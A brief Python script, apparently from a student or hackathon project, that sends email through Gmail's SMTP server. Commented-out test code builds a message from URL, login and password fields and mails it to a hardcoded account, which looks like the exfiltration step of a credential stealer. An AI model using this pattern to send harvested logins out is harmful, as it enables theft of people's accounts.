
import smtplib


def send_email(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()



#a = {'Url': 'sample', 'Login': 'sample', 'Password': 'sample'}
#s = ''
#for k,v in a.items():
 #       s+= k + '- ' + v
      #  s += '\n'
#send_email('hacktuesex@gmail.com', 'hacktuesEXAMPLE', s)



